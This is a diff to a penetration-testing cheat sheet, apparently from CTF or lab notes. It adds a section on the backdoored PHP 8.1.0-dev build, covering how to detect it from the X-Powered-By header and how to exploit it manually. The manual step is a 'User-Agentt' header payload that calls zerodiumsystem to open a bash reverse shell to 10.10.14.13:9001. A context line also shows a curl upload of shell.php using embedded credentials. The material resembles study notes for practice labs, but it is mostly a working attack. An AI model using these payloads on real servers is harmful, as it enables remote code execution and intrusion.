@@ -377,3 +377,20 @@ curl --user developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "n
 ```
 
 * Site will tell you the MD5 Hash name of the file and the directory it is located. Make sure to add the `.php` extension to the end.
+
+### PHP 8.1.0-dev
+
+* This version of php was backdoored
+* Detect with nikto or by capturing the server response in burp
+* `X-Powered-By: PHP 8/1/0/dev` --> what you are looking for&#x20;
+* Automated POC exploit
+* [https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)&#x20;
+* Manual Exploitation:
+* Capture a request in burp suite&#x20;
+* Add additional `User-Agentt` header to the request (yes it is supposed to be spelled with two t's)
+* Payload:
+
+```
+User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/10.10.14.13/9001 0>&1"');
+```
+
